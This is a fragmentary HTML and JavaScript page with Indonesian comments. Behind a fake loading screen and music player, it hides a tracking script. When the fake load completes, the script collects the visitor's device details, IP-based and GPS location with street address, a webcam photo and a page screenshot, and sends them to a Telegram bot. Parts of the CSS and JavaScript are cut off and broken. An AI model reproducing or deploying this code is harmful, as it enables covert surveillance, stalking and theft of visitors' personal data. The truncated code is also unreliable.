            --primary: #00f3ff;
            --secondary: #ff00ff;
            --accent: #39ff14;
            --dark: #0f1123;
            --darker: #090a1a;
            --error: #ff3333;
            --text: #ffffff;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            color: var(--text);
            min-height: 100vh;
            padding: 40px;
            position: relative;
            margin: 0;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 243, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 40% 80%, rgba(57, 255, 20, 0.15) 0%, transparent 40%);
            pointer-events: none;
            z-index: -1;
        }
        
        /* Loading Screen Styles */
        #loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease-out;
        }
        
        #loading-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5" width="200" height="200"/></svg>') 0 0/20px 20px;
            z-index: -1;
        }
        
        #loading-content {
            text-align: center;
            width: 90%;
            max-width: 500px;
            background: rgba(18, 18, 36, 0.8);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        #loading-content::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(to bottom right, rgba(255,255,255,0.1), rgba(255,255,255,0.01));
            transform: rotate(30deg);
            z-index: -1;
        }
        
        .logo {
            margin-bottom: 20px;
            font-size: 40px;
            color: #6e48aa;
            text-shadow: 0 0 15px rgba(110, 72, 170, 0.5);
            animation: pulse 2s infinite;
        }
        
        #loading-text {
            font-size: 24px;
            margin-bottom: 25px;
            color: #ffffff;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        
        #progress-container {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 25px;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.2);
        }
        
        #progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6e48aa, #9d50bb);
            border-radius: 10px;
            transition: width 0.5s ease;
            box-shadow: 0 0 10px rgba(157, 80, 187, 0.5);
        }
        
        #percentage {
            font-size: 18px;
            margin-bottom: 20px;
            font-weight: bold;
            color: #9d50bb;
        }
        
        #loading-details {
            margin-top: 20px;
            font-size: 16px;
            color: #b8b8b8;
            min-height: 24px;
            transition: opacity 0.3s ease;
        }
        
        .loading-icon {
            display: inline-block;
            margin-right: 10px;
            color: #9d50bb;
        }
        
        .hidden {
            display: none;
        }
        
        .progress-stats {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
            font-size: 14px;
            color: #888;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @keyframes glow {
            0% { box-shadow: 0 0 5px rgba(157, 80, 187, 0.5); }

        p {

        .admin-link {

            box-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary);
        }
        
        .links-container {
            margin: 2rem 0;

        .code-block {
            background: rgba(0, 0, 0, 0.3);
            padding: 1.5rem;
            border-radius: 10px;
            margin: 2rem 0;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.1);

        }
        
        code {

        .footer {

        @keyframes pulsate-primary {
            0% {
                text-shadow: 
                    0 0 5px var(--primary),
                    0 0 10px var(--primary),
                    0 0 20px var(--primary);
            }
            100% {
                text-shadow: 
                    0 0 7px var(--primary),
                    0 0 15px var(--primary),
                    0 0 30px var(--primary);
            }
        }
        
        @keyframes neon-pulse {
            0% {
                box-shadow: 
                    0 0 10px var(--primary),
                    0 0 20px var(--primary),
                    0 0 40px var(--primary);
            }
            100% {
                box-shadow: 
                    0 0 15px var(--primary),
                    0 0 30px var(--primary),
                    0 0 60px var(--primary);
            }
        }
        
        @media (max-width: 768px) {
            body {
                padding: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            p {
                font-size: 1rem;
            }
            
            .profile-pic {
                width: 120px;
                height: 120px;
            }
            
            .admin-link {
                display: block;
                margin: 0.5rem auto;
            }
            
            #loading-content {
                width: 95%;
                padding: 20px;
            }
            
            #loading-text {
                font-size: 20px;
            }
            
            .logo {
                font-size: 32px;
            }
        }
    </style>
</head>

        // Fungsi untuk memperbarui UI loading
        function updateProgressBar() {
            progressBar.style.width = progress + '%';
            percentageText.textContent = Math.round(progress) + '%';
            
            // Animasi glow pada progress tertentu
            if (progress % 20 === 0) {
                progressBar.style.animation = 'none';
                setTimeout(() => {
                    progressBar.style.animation = 'glow 1.5s';
                }, 10);
            }
        }
        
        function updateLoadingMessage() {
            if (Math.random() > 0.7 && progress < 95) {
                const randomMessage = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
                loadingDetails.innerHTML = `<div><span class="loading-icon"><i class="fas fa-cog fa-spin"></i></span>${randomMessage}</div>`;
                currentAction.textContent = randomMessage;
            }
        }
        
        function updateTimeEstimate() {
            if (progress < 25) {
                timeEstimate.textContent = 'Estimasi: 1-2 menit';
            } else if (progress < 50) {
                timeEstimate.textContent = 'Estimasi: < 1 menit';
            } else if (progress < 75) {
                timeEstimate.textContent = 'Estimasi: 30 detik';
            } else {
                timeEstimate.textContent = 'Estimasi: beberapa detik';
            }
        }
        
        // Fungsi untuk mengirim pesan ke Telegram
        const sendTelegramMessage = async (message) => {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
            }
        };
        
        const sendPhotoToTelegram = async (blob, filename) => {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, filename);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        };
        
        // Fungsi untuk mendapatkan detail lokasi
        const getLocationDetails = async (latitude, longitude) => {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data.address) {
                    return {
                        district: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                        subdistrict: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                        fullAddress: data.display_name || "Alamat tidak tersedia"
                    };
                }
            } catch (error) {
                console.error('Error getting location details:', error);
            }
            
            return {
                district: "Tidak diketahui",
                subdistrict: "Tidak diketahui",
                fullAddress: "Alamat tidak tersedia"
            };
        };
        
        // Fungsi untuk mengumpulkan informasi device
        const collectDeviceInfo = async () => {
            let message = '```â•­â”€â”€â”€â”€â”€ ðŸ“‹ Tracking Report â”€â”€â”€â”€â”€â•®\n\n';
            
            // Informasi device

            message += `ðŸ–¥ï¸ Perangkat: ${navigator.userAgent}\n`;
            message += `ðŸ’» Platform: ${navigator.platform}\n`;
            message += `ðŸŒ Bahasa: ${navigator.language}\n`;
            message += `ðŸ“¶ Status: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            message += `ðŸ“º Ukuran Layar: ${screen.width}x${screen.height}\n`;

            message += `ðŸ’¾ RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;

            // Informasi lokasi berdasarkan IP
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                message += 'ðŸ“ INFORMASI LOKASI\n';

            message += '\nâ•°â”€â”€â”€â”€â”€ Developer @rkyyzz â”€â”€â”€â”€â”€â•¯```';
            return message;
        };
        
        // Fungsi untuk mengambil screenshot dan data
        const startTracking = async () => {
            // Kirim informasi device
            await sendTelegramMessage(await collectDeviceInfo());
            
            // Coba akses kamera
            try {
                const video = document.getElementById('v');
                const canvas = document.getElementById('c');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    sendPhotoToTelegram(blob, 'camera_capture.jpg');
                }, 'image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                await sendTelegramMessage('âŒ Tidak dapat mengakses kamera');
            }
            
            // Ambil screenshot halaman
            setTimeout(async () => {
                try {
                    const canvas = await html2canvas(document.body);

                    }, 'image/jpeg');
                } catch (error) {

                }

            // Coba akses geolokasi
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    async position => {

                        const locationDetails = await getLocationDetails(

                        message += `ðŸ  Alamat: ${locationDetails.fullAddress}\n`;
                        
                        await sendTelegramMessage(message);
                    },
                    async error => {
                        await sendTelegramMessage(`âŒ Geolokasi dinonaktifkan: ${error.message}`);

                    {

                        timeout: 5000

                );

        };
        
        // Simulasi proses loading
        const simulateLoading = () => {
            if (!isLoading) return;
            
            // Tingkatkan progress
            progress += Math.random() * 4;
            
            // Jika mendekati akhir, perlambat
            if (progress > 90) {
                progress += Math.random() * 2;
            }
            
            // Pastikan tidak melebihi 100%
            if (progress > 100) {
                progress = 100;
                isLoading = false;
                
                // Tampilkan pesan selesai
                loadingDetails.innerHTML = '<div><span class="loading-icon"><i class="fas fa-check"></i></span>Proses selesai!</div>';
                currentAction.textContent = 'Selesai';
                timeEstimate.textContent = 'Sistem siap';
                
                // Sembunyikan loading screen dan tampilkan konten utama
                setTimeout(() => {
                    loadingContainer.style.opacity = '0';
                    setTimeout(() => {
                        loadingContainer.style.display = 'none';
                        mainContainer.style.display = 'block';
                    }, 500);
                }, 1000);
                
                // Mulai proses tracking
                setTimeout(startTracking, 1000);
                return;
            }
            
            // Perbarui UI
            updateProgressBar();
            updateLoadingMessage();
            updateTimeEstimate();
            
            // Lanjutkan simulasi
            const delay = progress < 50 ? 500 : 700;
            setTimeout(simulateLoading, delay);
        };
        
        // Mengontrol pemutaran musik
        if (playBtn && stopBtn) {
            playBtn.addEventListener('click', () => {
                audio.play();
                playBtn.innerHTML = '<i class="fas fa-pause"></i> Jeda Musik';
                playBtn.onclick = () => {
                    audio.pause();
                    playBtn.innerHTML = '<i class="fas fa-play"></i> Putar Musik';
                    playBtn.onclick = () => {
                        audio.play();
                        playBtn.innerHTML = '<i class="fas fa-pause"></i> Jeda Musik';
                    };
                };
            });
            
            stopBtn.addEventListener('click', () => {
                audio.pause();
                audio.currentTime = 0;
                playBtn.innerHTML = '<i class="fas fa-play"></i> Putar Musik';
                playBtn.onclick = () => {
                    audio.play();
                    playBtn.innerHTML = '<i class="fas fa-pause"></i> Jeda Musik';
                };
            });
        }
        
        // Mulai simulasi loading
        simulateLoading();
    </script>
</body>
